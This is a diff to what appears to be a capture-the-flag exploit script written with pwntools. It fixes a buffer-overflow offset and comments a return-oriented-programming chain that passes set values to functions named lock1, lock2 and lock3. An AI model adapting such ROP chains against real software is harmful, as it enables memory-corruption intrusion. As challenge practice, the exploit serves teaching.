@@ -78,15 +78,15 @@ pop_rdi = 0x0000000000400773
 pop_rsi_r15 = 0x0000000000400771
 
 #payload construction (ropping)
-payload = cyclic(cyclic_find("kaa"))
-payload += p64(pop_rdi)
+payload = cyclic(cyclic_find("kaaa")) #overflow the buffer into ret address
+payload += p64(pop_rdi) #jump to first gadget and pop the stack's next value into rdi
 payload += p64(5)
-payload += p64(lock1)
-payload += p64(pop_rdi)
+payload += p64(lock1) #jump to lock1
+payload += p64(pop_rdi) #pop stack's value into rdi 
 payload += p64(42)
-payload += p64(pop_rsi_r15)
+payload += p64(pop_rsi_r15) #into rsi and r15 
 payload += p64(1776)
-payload += p64(0xdeadbeef)
+payload += p64(0xdeadbeef) #dummy value
 payload += p64(lock2)
 payload += p64(lock3)
 
